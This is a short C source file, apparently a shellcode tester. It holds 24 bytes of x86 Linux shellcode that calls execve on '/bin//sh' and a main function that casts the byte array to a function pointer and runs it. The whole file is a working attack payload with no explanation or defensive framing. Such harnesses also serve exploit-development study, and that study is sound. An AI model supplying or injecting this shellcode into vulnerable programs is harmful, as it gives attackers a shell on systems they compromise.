#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x01\x59\x49\xcd\x80";











main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
